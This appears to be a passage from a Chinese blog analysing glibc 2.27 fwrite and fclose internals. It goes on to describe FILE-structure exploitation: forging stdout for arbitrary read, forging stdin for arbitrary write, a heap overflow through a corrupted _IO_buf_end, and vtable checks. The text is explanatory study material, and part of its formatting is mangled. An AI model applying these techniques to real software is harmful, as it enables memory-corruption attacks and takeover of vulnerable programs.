alt="_IO_new_file_xsputn(1)"><br>该函数中有<strong>3</strong>个比较重要的变量，分别是<strong>s</strong>表示放有待写入数据变量的首地址，<strong>to_do</strong>表示还需要写入的字节数，<strong>must_flush</strong>表示是否需要刷新缓冲区。接下来也是按照刚从<strong>fopen</strong>初始化完的状态开始分析。此时各字段均为空，也没有<strong>_IO_LINE_BUF、_IO_CURRENTLY_PUTTING</strong>属性，所以不会进入第<strong>1233、1250</strong>行的判断句，所以<strong>count</strong>变量没有被赋值仍然为<strong>0</strong>，也不会进入第<strong>1254</strong>行的判断语句。而<strong>to_do</strong>代表的需要写入的字节数没有变，因此会直接进入第<strong>1262</strong>行的判断语句，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-82719face09b2601.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_xsputn(2)"><br>进入语句后，声明了两个变量<strong>block_size</strong>和<strong>do_write</strong>，之后直接调用了<strong>_IO_OVERFLOW</strong>函数，该函数为虚表中的<strong>__overflow</strong>，即<strong>_IO_new_file_overflow</strong>函数，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-7232f74c875d2982.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_overflow(1)"><br>该函数首先判断文件是否含有<strong>_IO_NO_WRITES</strong>属性，即在<strong>fopen</strong>操作时是否为<strong>r</strong>只读选项，若是，则不会执行该函数直接返回。接着判断是否不含<strong>_IO_CURRENTLY_PUTTING</strong>属性或者<strong>_IO_write_base</strong>字段为空，其中<strong>_IO_CURRENTLY_PUTTING</strong>属性在该函数的第<strong>785</strong>行会进行赋值，因此该语句为判断没有正常执行过<strong>_IO_new_file_overflow</strong>函数或执行过但没有分配缓冲区的情况，会调用<strong>_IO_doallocbuf</strong>函数分配缓冲区，之后调用<strong>_IO_setg</strong>将与<strong>read</strong>相关的<strong>3</strong>个字段都赋值为<strong>_IO_buf_base</strong>，之后也会进行<strong>_IO_in_backup</strong>的检测，这几步操作在上一节<strong>_IO_new_file_underflow</strong>函数中有过详细描述，因此不再赘述。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-e075cd46723fd4f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_overflow(2)"><br>紧接着将<strong>read</strong>和<strong>write</strong>共<strong>6</strong>个字段都赋值为<strong>_IO_buf_base</strong>，并给文件流加上<strong>_IO_CURRENTLY_PUTTING</strong>属性。由于在<strong>_IO_new_file_xsputn</strong>调用该函数时的第二个参数，即函数中的<strong>ch</strong>变量为<strong>EOF</strong>，因此，会在第<strong>790</strong>行调用<strong>_IO_do_write</strong>函数并返回，传入的<strong>3</strong>个参数分别为<strong>FILE</strong>结构体指针、<strong>_IO_write_base</strong>以及<strong>_IO_write_ptr - _IO_write_base = 0</strong>。该函数在<strong>glibc/libio/fileops.c</strong>中有宏定义为<strong>_IO_new_do_write</strong>函数，其定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5ce67115f0341211.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_do_write"><br>可以看到<strong>_IO_new_do_write</strong>函数中，因为本次传入的第<strong>3</strong>个参数<strong>to_do</strong>为<strong>0</strong>，因此不会进行任何操作直接返回<strong>0</strong>，而不会去执行<strong>new_do_write</strong>函数。返回后回到<strong>_IO_new_file_xsputn</strong>的第<strong>1266</strong>行，不等于<strong>EOF</strong>，于是会继续执行。给<strong>block_size</strong>赋值为申请的空间大小，即<strong>4K</strong>，<strong>do_write</strong>代表通过调用<strong>new_do_write</strong>函数进行写入的数据大小，该数值是与<strong>block_size</strong>进行对齐的。接下来也是根据<strong>to_do</strong>与<strong>block_size</strong>的大小，函数将分成不同的流程。</p><ul><li><strong>to_do &lt; 4K</strong></li></ul><p>若要写入的数据小于<strong>4K</strong>，则<strong>do_write = 0</strong>，不会进入第<strong>1275</strong>行的判断语句，而是在<strong>1287</strong>行直接调用<strong>_IO_default_xsputn</strong>函数进行处理，该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4e13479e221abe0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_default_xsputn"><br>该函数主要实现了将数据从变量中拷贝到结构体缓冲区中的操作，主要有两种情况，一种是当要拷贝的数据大于<strong>20</strong>字节时，会直接调用<strong>__mempcpy</strong>进行拷贝，如果小于等于<strong>20</strong>，则用<strong>for</strong>循环逐字节进行拷贝，若缓冲区大小不够，则会调用<strong>_IO_OVERFLOW</strong>刷新缓冲区。<br>值得注意的是，<strong>_IO_default_xsputn</strong>函数仅仅实现了将数据从变量中拷贝到了从<strong>_IO_write_base</strong>到<strong>_IO_write_ptr</strong>为止的缓冲区中，并没有写入文件。</p><ul><li><strong>to_do &gt;= 4K</strong><br>若要写入的数据大于<strong>4K</strong>，则<strong>do_write</strong>被赋值为<strong>4K</strong>的倍数，将在第<strong>1277</strong>行调用<strong>new_do_write</strong>函数进行写入，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-8e1cfee8529a8c32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="new_do_write"><br>首先会判断是否具有<strong>_IO_IS_APPENDING</strong>属性，即判断该文件是由<strong>a</strong>属性打开还是由<strong>w</strong>属性打开：若为<strong>w</strong>属性，则将<strong>_offset</strong>字段赋值为<strong>-1</strong>；若为<strong>a</strong>属性，则<strong>_offset</strong>字段不变，这正是写文件时覆盖和追加方式的体现。之后判断<strong>_IO_read_end</strong>与<strong>_IO_write_base</strong>相等，若不等则调用<strong>_IO_SYSSEEK</strong>函数。对于本次调用的流程，这两个判断语句不会有太大的影响。主要是在函数的第<strong>457</strong>行执行了<strong>_IO_SYSWRITE</strong>函数，该函数为虚表中的<strong>__write</strong>，即为<strong>_IO_new_file_write</strong>函数，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-84b20ceebc2ae0d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_write"><br>该函数也是通过调用<strong>__write</strong>函数或<strong>__write_nocancel</strong>函数进行系统调用，将<strong>to_do</strong>长度的数据从<strong>data</strong>中写入文件中。调用完<strong>_IO_SYSWRITE</strong>函数后，若读入成功，即<strong>count</strong>不为<strong>0</strong>，在之后会调用<strong>_IO_adjust_column</strong>函数去更新<strong>FILE</strong>结构体中的<strong>_cur_column</strong>字段，该字段代表<strong>（</strong>文件的行数<strong>+1)</strong>，该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-97059da9f6a43558.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_adjust_column"><br>该函数通过判断上面通过<strong>_IO_SYSWRITE</strong>函数写入的数据中含有多少<strong>\n</strong>字符来确定文件中增加了多少行。调用完<strong>_IO_adjust_column</strong>后返回到<strong>new_do_write</strong>函数，之后会调用<strong>_IO_setg</strong>函数以及各种赋值操作将文件流中<strong>read、write</strong>相关<strong>6</strong>个字段都赋值为<strong>_IO_buf_base</strong>，类似于初始化的操作。综上，<strong>new_do_write</strong>函数完成了将对齐<strong>block_size</strong>大小的数据不通过缓冲区，直接从变量写入文件流的操作。从<strong>new_do_write</strong>函数返回后，之前未对齐的剩余的数据，则会在下方调用<strong>_IO_default_xsputn</strong>函数拷贝到缓冲区中。<blockquote><p>至此，分析完了<strong>fwrite</strong>函数主要流程，尤其是<strong>_IO_new_file_xsputn</strong>函数的执行流程。<strong>fwrite</strong>函数与<strong>fread</strong>相互对仗，<strong>fread</strong>是将文件中数据直接读入变量，或先从文件读入<strong>FILE</strong>结构体缓冲区，再利用<strong>read</strong>相关指针进行间接读入变量；<strong>fwrite</strong>是将数据直接从文件中写入变量或写入<strong>FILE</strong>结构体中的缓冲区。<strong>_IO_new_file_xsputn</strong>作为实现<strong>fwrite</strong>的重要函数，主要进行了<strong>**个操作：调用</strong>_IO_new_file_overflow<strong>函数为</strong>FILE<strong>结构体申请缓冲区；若</strong>n &lt; block_size<strong>时，直接调用</strong>__mempcpy<strong>函数拷贝到缓冲区中；若</strong>n &gt;= block_size<strong>时，会将对齐到</strong>block_size<strong>的部分用系统调用直接读入文件，剩余部分按与</strong>n &lt; block_size<strong>相同的方法拷贝到缓冲区中。<br>通过阅读源码，对</strong>fwrite**函数有了船新认识：</p><ul><li>本以为<strong>fwrite</strong>只是把<strong>fread</strong>的读操作变成写操作，其他都是相同的。然而<strong>fread</strong>执行完后不论多少数据都读入了变量中，而<strong>fwrite</strong>执行完后未对齐<strong>block_size</strong>大小的数据仍在缓冲区中，推测在执行<strong>fclose</strong>函数或在程序退出时才会真正的写入文件中。</li><li><strong>_IO_new_file_overflow</strong>函数并不仅仅有上文中描述的调用<strong>_IO_doallocbuf</strong>申请缓冲区的作用，其主要担负着刷新缓冲区的作用：第一种调用情况为上文中所提到的，当<strong>_IO_buf_base</strong>字段为空，即还未初始化缓冲区时，则会调用<strong>_IO_doallocbuf</strong>函数进行申请缓冲区；若缓冲区已经初始化，且<strong>_IO_write_end == _IO_write_ptr</strong>，即缓冲区已满时，则会把这些待写入内容写入文件，之后会将<strong>_IO_write_ptr</strong>赋值为<strong>_IO_buf_base</strong>，相当于清空缓冲区的操作。</li></ul></blockquote></li></ul><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a><strong>fclose</strong></h3><p>与<strong>fopen</strong>函数相同，在<strong>glibc/include/stdio.h</strong>中有如下宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fclose(fp) _IO_new_fclose(fp)</span></span><br></pre></td></tr></table></figure><p>即<strong>fclose</strong>函数的原形为<strong>_IO_new_fclose</strong>函数，该函数在<strong>glibc/libio/iofclose.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4f9c1e2f2afa1ee0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_fclose"><br>该函数主要是<strong>fopen</strong>函数的逆过程，首先在判断文件流是否含有<strong>_IO_file_flags</strong>和<strong>_IO_SI_FILEBUF</strong>后，函数会执行<strong>_IO_un_link</strong>函数，该函数在<strong>glibc/libio/genops.c</strong>定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-c2c53a727f467636.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_un_link"><br>该函数是<strong>_IO_link_in</strong>函数的逆过程，主要实现了将文件流从<strong>_IO_list_all</strong>链表中卸下，以及一些对结构体中字段的善后操作。接着调用了<strong>_IO_file_close_it</strong>函数，该函数在<strong>glibc/libio/fileops.c</strong>定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-7aad24fe5c29d466.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_close_it"><br>该函数在第<strong>134</strong>行判断是否为写属性的文件流，以及是否进行过写操作，若有，则会调用<strong>_IO_do_flush</strong>函数，该函数在<strong>glibc/libio/libioP.h</strong>中有宏定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-33a19ae348c65619.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_do_flush"><br>可以看到该函数直接是针对文件流的整个缓冲区去调用了<strong>_IO_do_write</strong>函数，即实现了将仍存在于缓冲区中的数据写入文件的操作。之后调用<strong>_IO_SYSCLOSE</strong>函数，该函数对应虚表中的<strong>__close</strong>，即<strong>_IO_file_close</strong>函数，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-15fed9b616faff3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_close"><br>该函数直接调用了<strong>__close_nocancel</strong>函数去执行系统调用对文件进行关闭。返回到<strong>_IO_new_file_close_it</strong>之后紧接着调用<strong>_IO_setb、_IO_setg、_IO_setp</strong>等函数将文件流中所有<strong>read</strong>和<strong>write</strong>字段置<strong>0</strong>，并在第<strong>159-161</strong>行将<strong>_flags、_fileno_offset</strong>修改为一个关闭状态的属性。返回到<strong>_IO_new_fclose</strong>函数后，主要去执行了<strong>_IO_FINISH</strong>函数，该函数为虚表中的<strong>__finish</strong>，即对应<strong>_IO_new_file_finish</strong>函数，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-9b2bea524a2cd4c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_finish"><br>该函数一次调用了<strong>_IO_do_flush、_IO_SYSCLOSE</strong>以及<strong>_IO_default_finish</strong>函数，其中<strong>_IO_default_finish</strong>函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-df90bc41c8810b4e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_default_finish"><br>可以看到<strong>_IO_new_file_finish</strong>中调用的几个函数，均在前面正常关闭的流程中有过调用，所以基本上都不会去执行。</p><blockquote><p>至此，完成了对<strong>fclose</strong>函数流程的分析，总的来说代码比较短暂，也都是对前面已经执行代码的一个逆过程，因此并没有太多需要注意的地方，主要还是印证了前面在<strong>fwrite</strong>结尾的一个预测，会在关闭文件流时去调用了<strong>_IO_do_flush</strong>函数将缓冲区内的数据写入文件。</p></blockquote><h2 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h2><h3 id="利用伪造stdout进行任意地址读"><a href="#利用伪造stdout进行任意地址读" class="headerlink" title="利用伪造stdout进行任意地址读"></a>利用伪造<strong>stdout</strong>进行任意地址读</h3><p><strong>stdout</strong>，即标准输出，默认为当前终端，其本质也为一个<strong>FILE</strong>结构体，利用这种方法最终达到将任意地址数据输出到终端供我们进行读的效果。因此首先定位到<strong>fwrite</strong>函数中输出的位置，即调用<strong>_IO_SYSWRITE</strong>的地方。由前小节的分析可知，只有在<strong>new_do_write</strong>函数中有对<strong>_IO_SYSWRITE</strong>的调用，而调用<strong>new_do_write</strong>理论上有两个地方，一个是在<strong>_IO_new_file_xsputn</strong>函数中的第<strong>1266</strong>行调用<strong>_IO_OVERFLOW</strong>函数中会有调用，以及在第<strong>1277</strong>行直接进行调用。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-0eb0d234ec9902b6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="调用_new_do_write"><br>第一种调用情况，在利用<strong>_IO_OVERFLOW</strong>函数通过调用<strong>_IO_do_write</strong>函数，实现间接调用<strong>new_do_write</strong>函数将<strong>_IO_write_base</strong>到<strong>_IO_write_ptr</strong>之间的数据进行写入。<br>首先我们需要获得执行到<strong>_IO_OVERFLOW</strong>函数的条件，主要还是第<strong>1262</strong>行的<strong>to_do + must_flush &gt; 0</strong>，因为正常函数调用时传进来的<strong>to_do</strong>均大于<strong>0</strong>，因此必然会进入该语句，所以前置条件几乎算是没有；<br>接下来进入<strong>_IO_OVERFLOW</strong>函数内部进行分析调用<strong>new_do_write</strong>函数的条件。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4691d11460defa08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="条件判断(1)"><br>可以看到在我们最终调用<strong>_IO_do_write</strong>函数之前会有2个比较关键的判断：第<strong>747</strong>行判断是否有写权限，若没有则会报错并返回，因此搜集到的第一个必要条件为：<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>；接下来一个重要判断是在第<strong>754</strong>行的判断，经过上一节的分析我们知道这个判断是用来判断缓冲区是否初始化的，若未初始化则会进入该判断语句，由于在该判断分支中最后会将<strong>FILE</strong>结构体中的<strong>write</strong>相关指针进行重新赋值，从而破坏了我们事先构造好的<strong>write</strong>指针，所以这个判断也不能进入，因此搜集到的第二个必要条件为<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-126d484c9ed58e92.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="条件判断(2)"><br>之后进入<strong>_IO_do_write</strong>函数，这个函数比较简单，只要满足<code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base != 0</code>便可调用<strong>new_do_write</strong>函数；最后在<strong>new_do_write</strong>函数中，只要满足<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code>即可调用<strong>_IO_SYSWRITE</strong>将<strong>_IO_write_base</strong>到<strong>_IO_write_ptr</strong>之间的数据输出。<br>第二种调用情况，是在第<strong>1277</strong>行直接调用<strong>new_do_write</strong>函数，因为此处第二个参数，即输出的数据段起始地址为外部传入参数，而不能通过伪造<strong>FILE</strong>结构体来进行控制，因此不能实现任意地址读的功能，直接<strong>PASS</strong>掉。</p><blockquote><p>综上，我们只要伪造满足这<strong>4</strong>个条件的<strong>stdout</strong>结构体就能够实现任意地址读，其中第<strong>1、2</strong>个条件为文件流<strong>不能</strong>具有<strong>_IO_NO_WRITES（0x8）</strong>属性，且具有<strong>_IO_CURRENTLY_PUTTING（0x800）</strong>属性，而且<strong>_flags</strong>位自带一个<strong>_IO_MAGIC（0xfbad0000）</strong>，因此构造的<strong>_flags</strong>为<strong>0xfbad0800</strong>。第<strong>3、4</strong>个条件就和<strong>read、write</strong>指针息息相关了，根据条件只要构造<strong>_IO_read_end = _IO_write_base = （</strong>想要<strong>leak</strong>的起始地址<strong>)</strong>，<strong>_IO_write_ptr = (</strong>想要<strong>leak</strong>的结束地址<strong>)</strong>，其他<strong>3</strong>个没有提到的指针置<strong>0</strong>就可以了。<br>因此伪造的<strong>fake_FILE</strong>结构体大概长这样（一般用<strong>got</strong>表进行<strong>libc</strong>的<strong>leak</strong>）：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-059475ff6ca581a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fake_FILE"><br>在我们最终伪造好这个<strong>FILE</strong>结构体后再去调用针对<strong>stdout</strong>进行输出的函数就可以实现任意地址读了，常见的函数一般有<strong>printf、fwrite、puts</strong>等。</p></blockquote><h3 id="利用伪造stdout进行任意地址写"><a href="#利用伪造stdout进行任意地址写" class="headerlink" title="利用伪造stdout进行任意地址写"></a>利用伪造<strong>stdout</strong>进行任意地址写</h3><p>在<strong>_IO_new_file_xsputn</strong>函数中，不仅调用了<strong>_IO_SYSWRITE</strong>进行了输出，而且也有调用<strong>__mempcpy</strong>函数将要输出的数据写入缓冲区的操作，该操作在函数中的第<strong>1258</strong>行，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5dd971733a7f2d07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="写入缓冲区"><br>根据调用的参数，可通过伪造<strong>FILE</strong>结构体达到将<strong>s</strong>中数据向我们可控指针<strong>f-&gt;_IO_write_ptr</strong>中写的操作，即不可控制内容的任意地址写。可以看到执行该语句的最主要判断为<strong>count &gt; 0</strong>，而<strong>count</strong>变量在上方有多次赋值操作，对于已经控制了<strong>FILE</strong>结构体的我们来说轻而易举，但在执行之前会与<strong>to_do</strong>变量进行比较，取较小的长度进行写入，其中<strong>to_do</strong>变量为调用时想要写入的长度，一般为字符串的长度。如，<code>puts(&quot;12345678&quot;)</code>在调用该函数时，<strong>to_do</strong>的值就为<strong>8</strong>，<strong>s</strong>变量就是指向<strong>12345678</strong>这个字符串的开头。</p><blockquote><p>综上，我们只需要构造如下的<strong>fake_FILE</strong>就能够实现将字符串写到指定内存的操作。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-87222aecb7aca5e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fake_FILE"><br>虽然看起来不能实现任意地址写任意数据，但若是输出我们输入的值时，则可实现任意地址写任意数据；就算输出的都是固定字符串，能够将一些判断标志改为其他值，而改变程序正常执行流程有时还是很有用的。</p></blockquote><h3 id="利用伪造stdin进行任意地址写"><a href="#利用伪造stdin进行任意地址写" class="headerlink" title="利用伪造stdin进行任意地址写"></a>利用伪造<strong>stdin</strong>进行任意地址写</h3><p><strong>stdin</strong>，即标准输出，默认为键盘，其本质也为一个FILE结构体，利用这种方法最终达到由我们从键盘输入的数据写到任意地址的效果。同样，首先我们需要定位到<strong>fread</strong>函数中获取输入的位置，即调用<strong>_IO_SYSREAD</strong>函数的地方。由前小节分析可知仅有在<strong>_IO_UNDERFLOW</strong>函数中会调用<strong>_IO_SYSREAD</strong>函数进行写入， 程序在<strong>_IO_file_xsgetn</strong>函数中是通过第<strong>1344</strong>行调用<strong>__underflow</strong>函数来间接调用该函数，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-8add78f4224dbae7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="条件判断(1)"><br>与利用<strong>stdout</strong>进行任意地址读有所不同的是，并不是每次执行都会顺理成章地去调用<strong>_IO_UNDERFLOW</strong>函数，而会有很多外部的限制条件。首先我们可以看到在调用<strong>__underflow</strong>函数之间就有了许多的限制。从调用处开始往上看，首先最息息相关的两个条件判断支，第一个为第<strong>1341</strong>行的判断要求<code>fp-&gt;_IO_buf_base != NULL &amp;&amp; want &lt; fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>，其中<strong>want</strong>变量的值为传入的参数<strong>n</strong>，即想要读入的字节数；第二个条件为不满足第<strong>1316</strong>行的判断语句，即<code>want &gt; fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr</code>。其实除了这<strong>2</strong>个判断语句外，在第<strong>1302</strong>行的判断也不能为真，因为进入该分支后会调用<strong>_IO_doallocbuf</strong>函数重新分配缓冲区，会破坏我们事先构造好的<strong>FILE</strong>结构体，但由于该判断句的条件包含于<strong>1341</strong>行的判断句，所以不单独算一个条件。满足这两个条件后，程序正常执行到了<strong>__underflow</strong>函数，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-04ffb10e0191d12e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="条件判断(2)"><br>可以看到我们最终要调用的<strong>_IO_UNDERFLOW</strong>函数在该函数的最终结尾处，因此要小心的过掉上面的各个分支。通过观察，大部分分支在正常情况下都不会进入，需要注意的是一个在第<strong>296</strong>行的<strong>if</strong>语句不能满足，因此第<strong>3</strong>个条件为<code>fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</code>，接下来进入<strong>_IO_UNDERFLOW</strong>函数内部，即<strong>_IO_new_file_underflow</strong>函数，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-b67a408b1f043fb7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="条件判断(3)"><br>在<strong>_IO_new_file_underflow</strong>函数的第<strong>531</strong>行调用了<strong>_IO_SYSREAD</strong>函数的调用，其上方仍有许多<strong>if</strong>分支，看似特别多，其实只有第<strong>478</strong>行的影响比较大，即第<strong>4</strong>个条件为<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>。之后第<strong>484、487</strong>行的分支虽然都不能进入，但这些判断条件在调用前已经囊括了，因此不做重复搜集；第<strong>500</strong>行的条件分支也没有进去的必要，之后就能够顺利地调用<strong>_IO_SYSREAD</strong>函数，实现向<strong>fp-&gt;_IO_buf_base</strong>地址写入从键盘输入<strong>_IO_buf_base - _IO_buf_end</strong>长度数据的功能。</p><blockquote><p>综上，我们只要伪造满足这<strong>4</strong>个条件的<strong>stdin</strong>结构体就能够实现任意地址写，其中第<strong>1</strong>个条件与调用时本来要写入的数据长度有关，我们要伪造的写入大小应该比其本要写入的大小更大。比如，在调用<strong>read(0 , buf , 0x10)</strong>函数时，我们构造的<strong>_IO_buf_end - _IO_buf_base</strong>就应该大于<strong>0x10</strong>；第<strong>2、3</strong>个条件综合起来可构造<strong>_IO_read_ptr == fp-&gt;_IO_read_end</strong>来同时满足，也不知道给个什么值，就默认为<strong>0</strong>吧；第<strong>4</strong>个就是<strong>_flags</strong>属性的问题了，不包含<strong>_IO_NO_READS</strong>。<br>因此伪造的<strong>fake_FILE</strong>结构体大概长这样：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-11617a5f823d0117.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="fake_FILE"><br>在我们最终伪造好这个<strong>FILE</strong>结构体后再去调用针对<strong>stdin</strong>进行输入的函数就可以实现任意地址写了，常见的函数一般有<strong>scanf、fread、gets、fgets</strong>等。</p></blockquote><h3 id="修改stdin-gt-IO-buf-end而导致的堆溢出"><a href="#修改stdin-gt-IO-buf-end而导致的堆溢出" class="headerlink" title="修改stdin-&gt;_IO_buf_end而导致的堆溢出"></a>修改<strong>stdin-&gt;_IO_buf_end</strong>而导致的堆溢出</h3><p>再次回到执行<strong>fread</strong>函数过程中在<strong>_IO_new_file_underflow</strong>中调用<strong>_IO_SYSREAD</strong>将文件中的数据读入缓冲区的地方，即<strong>_IO_new_file_underflow</strong>的第<strong>531</strong>行，此时调用如下：</p><figure class="highlight plain"><figcaption><span>fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base)```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">通过上文的分析可知，**_IO_buf_base**指向所申请的堆的头部，**_IO_buf_end**指向所申请的堆的末尾，在执行**fread**过程中当**文件大小 &lt;&#x3D; 缓冲区大小**时（这个大小通常是**4K**），会执行到这一步，将文件中数据全部读入缓冲区中。但，正如这个调用语句所示，此处的**缓冲区大小**是由**_IO_buf_end - _IO_buf_base**所决定。</span><br><span class="line">有这样一种场景，在申请过缓冲区后，**_IO_buf_base**指向缓冲区的头部，而通过某些手段，我们能够修改**_IO_buf_end**为别的更大的值，在执行相应函数时则会造成堆溢出。而这种手段，我们可以在有**unsortbin attack**的条件下，很轻松地将**_IO_buf_end**修改为**main_arena**上的很大的值，那么我们就可以构造这样一个文件或输入，一直覆盖到**main_arena**之前的**free_hook**等敏感指针。</span><br><span class="line"></span><br><span class="line">### 劫持**vable**</span><br><span class="line">对**FILE**结构体的虚表的利用，早在**libc-2.23**版本时就有了**FSOP**之类的伪造**vtable**劫持控制流的利用方法等，但随着版本的更新，从**2.24**版本开始，对调用**vtable**的合法性检查也开始进行了**check**，这就导致了前版本中直接更改**vtable**的利用方法变得不可行。同样，在本文的**2.27**版本中，在调用**vtable**之前也是有这一定的**check**机制。下面我们就分析**vtable**的**check**机制，以及利用方法。</span><br><span class="line">首先我们来定位**vtable**调用的地方，从前小节的分析中，可以找到许多调用的地方，比如**_IO_new_file_xsputn**函数第**1266**行调用的**_IO_OVERFLOW**函数就是**vtable**的入口。追随**_IO_OVERFLOW**的脚步，可以在**glibc&#x2F;libio&#x2F;libioP.h**中找到如下宏定义：</span><br><span class="line">&#96;&#96;&#96;C</span><br><span class="line">#define _IO_OVERFLOW(FP, CH) JUMP1(__overflow, FP, CH)</span><br><span class="line">......</span><br><span class="line">#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span><br><span class="line">......</span><br><span class="line">#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span><br></pre></td></tr></table></figure><p>通过多个宏定义，我们可以发现，在调用<strong>vtable</strong>所代表的函数之前，首先调用了<strong>IO_validate_vtable</strong>函数，该函数在<strong>glibc/libio/libioP.h</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-7304b1445b88fa61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IO_validate_vtable"><br>该函数首先判断了调用的<strong>vtable</strong>函数地址是否在<strong><strong>start_</strong>libc_IO_vtable</strong>与<strong><strong>stop_</strong>libc_IO_vtable</strong>之间，若在此之间，则说明是<strong>libc</strong>中的合法<strong>vtable</strong>地址。若不在这个区间，则会调用第<strong>876</strong>行的<strong>_IO_vtable_check</strong>函数进行进一步的检查。该函数在<strong>glibc/libio/vtable.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-29f1648d3d95daf1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_vtable_check"><br>由于存在预编译头，且<strong>SHARE、PTR_DEMANGLE</strong>是有定义的，因此会执行上面两个部分的检查。第一部分为判断引用的虚表指针是否为默认命名空间外重构的虚表指针，其中<strong>atomic_load_relaxed</strong>函数为获得加载指针的当前值，<strong>PTR_DEMANGLE</strong>函数则是类似<strong>canary</strong>之类的一个保护虚表不被修改的函数；第二部分则是检查引用的虚表指针是否为动态链接库中加载的函数。但我们在<strong>2.23</strong>版本中通常将堆或栈上的一块区域用来伪造为<strong>FILE</strong>结构体，同样<strong>vtable</strong>也就接在这个<strong>fake_FILE</strong>结构体的后面，所以上面的<strong>3</strong>个条件都不会满足。因此，在新版本中用曾经的利用方法最终会执行到<strong>_IO_vtable_check</strong>函数的第<strong>72</strong>行，报错并结束进程。<br>上面介绍完了新版本中加入的<strong>3</strong>个对<strong>vtable</strong>的<strong>check</strong>机制，下面讲讲大神们是如何绕过<strong>check</strong>并再次实现利用的。<br>由于<strong>_IO_vtable_check</strong>函数中的第一个检查，有<strong>PTR_DEMANGKE</strong>函数的存在，几乎时不能够伪造对应的条件；而